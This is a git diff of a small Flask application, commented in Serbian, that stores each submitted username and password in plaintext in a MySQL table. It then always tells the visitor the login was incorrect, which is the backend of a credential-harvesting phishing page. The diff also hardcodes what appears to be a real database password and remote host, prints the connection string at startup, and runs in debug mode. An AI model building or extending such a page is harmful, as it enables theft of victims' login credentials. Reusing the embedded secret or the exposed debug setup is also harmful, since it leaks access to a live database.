@@ -1,32 +1,32 @@
 import os
 from flask import Flask, render_template, request, flash, redirect, url_for
 from flask_sqlalchemy import SQLAlchemy
+from sqlalchemy import text
 
-# ✅ Flask aplikacija
 app = Flask(__name__)
 
 # ✅ Railway MySQL povezivanje
-DATABASE_URL = os.getenv('DATABASE_URL', 'mysql+pymysql://root:password@localhost:3306/railway')
+DATABASE_URL = os.getenv('DATABASE_URL', 'mysql+pymysql://root:aiBzbPEEvtrurGaPrXjVZWgdVDjgABbt@maglev.proxy.rlwy.net:50172/railway')
 app.config['SQLALCHEMY_DATABASE_URI'] = DATABASE_URL
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 app.secret_key = os.urandom(24)
+app.config['SQLALCHEMY_ENGINE_OPTIONS'] = {'pool_pre_ping': True}
 
 # ✅ Inicijalizacija baze
 db = SQLAlchemy(app)
 
-# ✅ Model za čuvanje unetih login podataka
 class LoginAttempt(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     username = db.Column(db.String(150), nullable=False)
     password = db.Column(db.String(150), nullable=False)
 
-    def __repr__(self):
-        return f'<LoginAttempt {self.username}>'
-
-# ✅ Kreiranje tabela ako ne postoje
 with app.app_context():
     try:
-        db.session.execute('SELECT 1')  # Test konekcije
+        # ✅ Provera konekcije
+        with db.engine.connect() as connection:
+            result = connection.execute(text('SELECT 1'))
+            print(f"✅ Konekcija uspešna: {result.fetchone()}")
+        
         db.create_all()
         print("✅ Baza podataka je povezana i tabele su kreirane!")
     except Exception as e:
@@ -47,7 +47,6 @@ def submit():
         flash("Sva polja su obavezna!", "danger")
         return redirect(url_for('index'))
 
-    # ✅ Čuvanje unetih podataka u bazu
     try:
         new_attempt = LoginAttempt(username=username, password=password)
         db.session.add(new_attempt)
@@ -59,7 +58,6 @@ def submit():
 
     return render_template('index.html', message="Incorrect username or password.")
 
-# ✅ Pokretanje aplikacije
 if __name__ == '__main__':
-    port = int(os.environ.get("PORT", 10000))
-    app.run(host="0.0.0.0", port=port, debug=True)
+    print("DATABASE URL:", app.config['SQLALCHEMY_DATABASE_URI'])
+    app.run(host="0.0.0.0", port=10000, debug=True)
